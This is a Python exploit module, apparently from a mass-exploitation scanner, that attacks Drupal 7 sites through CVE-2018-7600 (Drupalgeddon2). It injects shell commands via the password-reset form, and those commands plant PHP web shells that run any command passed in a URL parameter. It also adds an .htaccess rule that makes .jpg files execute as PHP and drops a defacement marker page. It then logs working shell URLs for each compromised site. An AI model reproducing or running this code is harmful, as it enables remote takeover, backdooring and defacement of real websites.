# coding=utf-8
import requests, re
import printModule

r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}


def Exploit(site):
    try:
        payloadshell = "neko!!<?php {}({}['{}']);?>".format('system', '$_GET', 'cmd')
        PrivatePAyLoad = "echo 'neko!!' > neko.htm;" \
                         " echo '" + payloadshell + "'> sites/default/files/neko.php;" \
                                                    " echo '" + payloadshell + "'> neko.php;" \
                                                                               " cd sites/default/files/;" \
                                                                               " echo 'AddType application/x-httpd-php .jpg' > .htaccess;" \
                                                                               " echo '" + payloadshell + "'> up.php;"
        get_params = {'q': 'user/password', 'name[#post_render][]': 'passthru',
                      'name[#markup]': PrivatePAyLoad, 'name[#type]': 'markup'}
        post_params = {'form_id': 'user_pass', '_triggering_element_name': 'name'}

        r = requests.post('http://' + site, data=post_params, params=get_params, headers=Headers)
        m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.content)
        if m:
            found = m.group(1)
            get_params = {'q': 'file/ajax/name/#value/' + found}
            post_params = {'form_build_id': found}
            requests.post('http://' + site, data=post_params, params=get_params, headers=Headers)
            a = requests.get('http://' + site + '/sites/default/files/neko.php',
                             timeout=10, headers=Headers)
            if 'neko!!' in str(a.content):
                with open('result/Shell_results.txt', 'a') as writer:
                    writer.write(site + '/sites/default/files/neko.php?cmd=id' + '\n')
                gg = requests.get('http://' + site + '/neko.htm', timeout=10, headers=Headers)
                CheckUploader = requests.get('http://' + site + '/sites/default/files/up.php',
                                             timeout=10, headers=Headers)
                if 'neko!!' in str(CheckUploader.content):
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(site + '/sites/default/files/up.php?cmd=pwd' + '\n')
                if 'neko!!' in str(gg.content):
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/neko.htm' + '\n')
                return printModule.returnYes(site, 'CVE-2018-7600', 'Drupal7 core Geddon2', 'Drupal')
            else:
                gg = requests.get('http://' + site + '/neko.htm', timeout=10, headers=Headers)
                if 'neko!!' in str(gg.content):
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/neko.htm' + '\n')
                    Checkshell = requests.get('http://' + site + '/neko.php', timeout=10, headers=Headers)
                    if 'neko!!' in str(Checkshell.content):
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(site + '/neko.php?cmd=id' + '\n')
                    return printModule.returnYes(site, 'CVE-2018-7600', 'Drupal7 core Geddon2', 'Drupal')
                else:
                    return printModule.returnNo(site, 'CVE-2018-7600', 'Drupal7 core Geddon2', 'Drupal')
        else:
            return printModule.returnNo(site, 'CVE-2018-7600', 'Drupal7 core Geddon2', 'Drupal')
    except:
        return printModule.returnNo(site, 'CVE-2018-7600', 'Drupal7 core Geddon2', 'Drupal')
